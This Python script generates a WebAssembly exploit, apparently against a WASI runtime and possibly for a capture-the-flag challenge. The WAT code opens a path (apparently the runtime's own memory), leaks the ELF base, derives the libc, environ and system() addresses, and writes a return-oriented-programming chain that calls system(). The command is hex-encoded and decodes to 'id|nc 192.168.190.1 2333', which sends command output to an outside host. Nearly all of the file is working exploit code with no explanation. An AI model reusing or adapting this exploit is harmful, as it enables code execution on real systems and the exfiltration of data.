#coding:utf8

code = '''
(module
  (type (;0;) (func))
  (type (;1;) (func (param i32 i32 i32 i32) (result i32)))
  (type (;2;) (func (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))
  (type (;3;) (func (param i32 i64 i32 i32) (result i32)))
  (type (;4;) (func (param i32 i64 i64) (result i32)))
  (type (;5;) (func (param i32 i64) (result i32)))

  (import "wasi_snapshot_preview1" "fd_write" (func $__fd_write (type 1)))
  (import "wasi_snapshot_preview1" "fd_read" (func $__fd_read (type 1)))
  (import "wasi_snapshot_preview1" "path_open" (func $__path_open (type 2)))
  (import "wasi_snapshot_preview1" "fd_seek" (func $__fd_seek (type 3)))


  (global $tmp_fd (;0;) (mut i32) (i32.const 0xff))
  (global $elf_base (;0;) (mut i64) (i64.const 0x6666))
  (global $pc (;0;) (mut i64) (i64.const 0x1111))
  (global $free_addr (;0;) (mut i64) (i64.const 0x2222))
  (global $wasm_code_len (;0;) (mut i32) (i32.const 0x3333))

  (func $_global_get (type 4)
     local.get 0
     global.get $elf_base
     i64.const 0x33080
     i64.add
     i64.store

     local.get 0
     i32.const 0x8
     i32.add
     local.get 1
     i64.store

     local.get 0
     i32.const 0x10
     i32.add
     local.get 2
     i64.store
     local.get 0
     i32.const 0x18
     i32.add
  )

  (func $_local_get (type 4)
     local.get 0
     global.get $elf_base
     i64.const 0x334a0
     i64.add
     i64.store

     local.get 0
     i32.const 0x8
     i32.add
     local.get 1
     i64.store

     local.get 0
     i32.const 0x10
     i32.add
     local.get 1
     i64.store

     local.get 0
     i32.const 0x18
     i32.add
     local.get 2
     i64.store
     local.get 0
     i32.const 0x20
     i32.add
  )

  (func $_global_set (type 5)
     local.get 0
     global.get $elf_base
     i64.const 0x33140
     i64.add
     i64.store

     local.get 0
     i32.const 0x8
     i32.add
     local.get 1
     i64.store

     local.get 0
     i32.const 0x10
     i32.add
  )

  (func $_raw_store (type 5)
     local.get 0
     local.get 1
     i64.store

     local.get 0
     i32.const 0x8
     i32.add
  )

  (func $_add (type 4)
     local.get 0
     global.get $elf_base
     i64.const 0x2fba0
     i64.add
     i64.store

     local.get 0
     i32.const 0x8
     i32.add
     local.get 1
     i64.store

     local.get 0
     i32.const 0x10
     i32.add
     local.get 2
     i64.store

     local.get 0
     i32.const 0x18
     i32.add
  )

  (func $_sub (type 4)
     local.get 0
     global.get $elf_base
     i64.const 0x2fc00
     i64.add
     i64.store

     local.get 0
     i32.const 0x8
     i32.add
     local.get 1
     i64.store

     local.get 0
     i32.const 0x10
     i32.add
     local.get 2
     i64.store

     local.get 0
     i32.const 0x18
     i32.add
  )

  (func $_start (type 0)
     (local i64 i64 i64 i64 i64 i64 i64 i64 i64 i64)
     i32.const 0x1
     memory.grow

     i32.const 0
     i32.const 0x742f2e
     i32.store

     i32.const 3
     i32.const 1
     i32.const 0
     i32.const 0x4
     i32.const 0x1
     i64.const 0x4600077
     i64.const 0
     i32.const 0
     i32.const 0
     call $__path_open
     drop
     i32.const 0
     i32.load
     global.set $tmp_fd

     global.get $tmp_fd
     i64.const 0
     i32.const 0
     i32.const 0
     call $__fd_seek
     drop

     i32.const 0
     i32.const 0x22fd8
     i32.store
     i32.const 0x4
     i32.const 0x50
     i32.store

     i32.const 0x100
     i32.const 0
     i32.store

     global.get $tmp_fd
     i32.const 0x0
     i32.const 0x1
     i32.const 0x100
     call $__fd_write
     drop

     global.get $tmp_fd
     i64.const 0
     i32.const 0
     i32.const 0
     call $__fd_seek
     drop

     i32.const 0
     i32.const 0
     i32.store
     i32.const 0x4
     i32.const 0x50
     i32.store

     global.get $tmp_fd
     i32.const 0
     i32.const 0x1
     i32.const 0x100
     call $__fd_read
     drop

     i32.const 0
     i64.load
     i64.const 0x1008
     i64.add
     global.set $pc

     i32.const 0x48
     i64.load
     i64.const 0x2ad40
     i64.sub
     global.set $elf_base

     //free offset
     i64.const 0x44cb0
     local.set 0
     //environ offset
     i64.const 0xd8240
     local.set 1
     //system offset
     i64.const 0x6f0b0
     local.set 2
     //zero
     i64.const 0
     local.set 3
     //pop rdi ; pop rbp ; ret
     i64.const 0x00000000000215ba
     global.get $elf_base
     i64.add
     local.set 4
     //rdi arg address
     global.get $pc
     i64.const 0x298
     i64.add
     local.set 5
     //rop offset
     i64.const 0x3760
     local.set 6
     i64.const 0x8
     local.set 7
     i64.const 0x18
     local.set 8
     i64.const 0x000000000002115e
     global.get $elf_base
     i64.add
     local.set 9


     //get free addr
     i32.const 8
     global.get $elf_base
     i64.const 0x63ab8
     i64.add
     i64.const 0x64
     call $_global_get
     //get libc_base
     i64.const 0
     i64.const 0x64
     call $_sub
     //store to $pc
     global.get $pc
     call $_global_set
     //get libc_base
     global.get $pc
     i64.const 0x62
     call $_global_get
     //get environ_ptr_address
     i64.const 0x2
     i64.const 0x62
     call $_add
     //change 0x1111111111111111 to environ_ptr_address
     global.get $pc
     i64.const 0x88
     i64.add
     call $_global_set

     //[0] get environ address
     i64.const 0x1111111111111111
     i64.const 0x62
     call $_global_get

     //get rop_address
     i64.const 0xc
     i64.const 0x62
     call $_sub
     //store rop address to $pc+0x18
     global.get $pc
     i64.const 0x18
     i64.add
     call $_global_set


     //get libc_base
     global.get $pc
     i64.const 0x62
     call $_global_get
     //get system_address
     i64.const 0x4
     i64.const 0x62
     call $_add
     //store system_address to $pc+0x10
     global.get $pc
     i64.const 0x10
     i64.add
     call $_global_set

     //get rop address
     global.get $pc
     i64.const 0x18
     i64.add
     i64.const 0x62
     call $_global_get
     //mov rcx,value
     i64.const 0x6
     i64.const 0x62
     call $_add
     //set 0x0xaaaaaaaaaaaaaaaa to rop_address
     global.get $pc
     i64.const 0x180
     i64.add
     call $_global_set


     //get pop_rdi address
     i64.const 0x8
     i64.const 0x62
     call $_local_get
     i64.const 0x6
     i64.const 0x62
     call $_add

     //write pop rdi address to rop
     i64.const 0xaaaaaaaaaaaaaaaa
     call $_global_set


     //get rop address
     global.get $pc
     i64.const 0x18
     i64.add
     i64.const 0x62
     call $_global_get
     //add rcx,0x8
     i64.const 14
     i64.const 0x62
     call $_add
     //set 0xbbbbbbbbbbbbbbbb to rop_address+8
     global.get $pc
     i64.const 0x208
     i64.add
     call $_global_set


     //get rdi args address
     i64.const 0xa
     i64.const 0x62
     call $_local_get
     i64.const 0x6
     i64.const 0x62
     call $_add

     //write rdi args address to rop+0x8
     i64.const 0xbbbbbbbbbbbbbbbb
     call $_global_set


     //get rop address
     global.get $pc
     i64.const 0x18
     i64.add
     i64.const 0x62
     call $_global_get
     //add rcx,0x10
     i64.const 0x10
     i64.const 0x62
     call $_add
     //set 0xcccccccccccccccc to rop_address+0x18
     global.get $pc
     i64.const 0x288
     i64.add
     call $_global_set


     //get system address
     global.get $pc
     i64.const 0x10
     i64.add
     i64.const 0x62
     call $_global_get
     i64.const 0x6
     i64.const 0x62
     call $_add

     //write system address to rop+0x10
     i64.const 0xcccccccccccccccc
     call $_global_set
     //ret
     local.get 9
     call $_raw_store
     //cmd
     i64.const 0x393120636E7C6469
     call $_raw_store
     i64.const 0x39312E3836312E32
     call $_raw_store
     i64.const 0x3333333220312E30
     call $_raw_store
     i64.const 0
     call $_raw_store

     global.set $wasm_code_len




     global.get $tmp_fd
     i64.const 0
     i32.const 0
     i32.const 0
     call $__fd_seek
     drop

     i32.const 0
     i32.const 0x8
     i32.store
     i32.const 0x4
     global.get $wasm_code_len
     i32.store

     global.get $tmp_fd
     i32.const 0
     i32.const 0x1
     i32.const 0x100
     call $__fd_write
     drop

     global.get $tmp_fd
     i64.const 0
     i32.const 0
     i32.const 0
     call $__fd_seek
     drop

     i32.const 0
     i32.const 0x23020
     i32.store
     i32.const 0x4
     global.get $wasm_code_len
     i32.store

     global.get $tmp_fd
     i32.const 0
     i32.const 0x1
     i32.const 0x100
     call $__fd_read
     drop


     i32.const 0
     br_table %s

  )
  (memory (;0;) 0x1)
  (export "_start" (func $_start))
)
'''

code = code % ('0 (;@0;)'*0x2ffd)

lines = code.split('\n')
code = ''
for line in lines:
   if '//' not in line:
      code += line + '\n'

f = open('wi.wat','w')
f.write(code)
f.close()
